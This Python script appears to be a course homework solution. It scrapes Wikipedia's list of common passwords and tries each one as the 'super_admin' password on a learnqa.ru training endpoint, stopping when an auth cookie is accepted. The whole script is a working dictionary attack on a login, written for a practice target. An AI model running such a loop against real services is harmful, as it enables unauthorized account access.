from bs4 import BeautifulSoup
import requests

url = "https://en.wikipedia.org/wiki/List_of_the_most_common_passwords"
response = requests.get(url, headers = {'User-Agent': 'Mozilla/5.0'})
response.encoding = 'utf-8'

soup = BeautifulSoup(response.text, 'html.parser')

target_caption = "Top 25 most common passwords by year according to SplashData"

table = soup.find('caption',  string=lambda text: text and target_caption.lower() in text.lower().strip()).parent

data = []
rows = table.find_all('tr')[1:]
for row in rows:
    cells = row.find_all(['td', 'th'])[1:]
    row_data = [cell.get_text(strip=True) for cell in cells]
    if row_data:
        data.extend(row_data)

i = 0

while True:
    password = data[i]
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data= { "login": "super_admin", "password": password })
    test_cookie = response.cookies["auth_cookie"]

    response = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies = { "auth_cookie": test_cookie })
    if response.text == "You are authorized":
        print(password, response.text)
        break
    i=i+1